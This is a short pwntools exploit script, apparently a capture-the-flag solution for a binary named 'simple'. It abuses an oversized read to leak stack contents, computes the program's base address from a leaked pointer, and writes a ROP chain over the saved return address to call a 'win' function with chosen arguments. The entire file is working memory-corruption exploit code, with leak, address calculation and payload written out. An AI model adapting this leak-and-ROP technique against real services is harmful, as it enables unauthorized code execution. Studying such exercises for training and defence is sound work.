from pwn import *
try:
    from tqdm import tqdm
except:
    def tqdm(iter):
        return iter

context.binary = elf = ELF(args.BINARY or "./simple", checksec=False)
context.log_level = "warning"

io = process()
if args.DBG:
    gdb.attach(io.pid)

io.sendlineafter(b"? ", b"r")
io.sendlineafter(b"? ", b"512") # 512 < 0x256
leak = io.read(512)

ptrs = [unpack(leak[i:i+8]) for i in range(0, len(leak), 8)]

main_addr = ptrs[39]
elf.address = main_addr - elf.sym.main

rop = ROP(elf)
rop.call(elf.sym.win, [123, 321])
payload = list(leak)
nop = pack(rop.find_gadget(["ret"]).address)
chain = rop.chain()
print(rop.dump())

ret_addr_idx = 35
payload[ret_addr_idx * 8:ret_addr_idx * 8 + len(chain)] = chain

io.sendlineafter(b"? ", b"w")
io.sendlineafter(b"? ", b"512")
io.send(bytes(payload))
io.sendlineafter(b"? ", b"q", timeout=1)
print(io.readall(timeout=1).decode().rstrip())
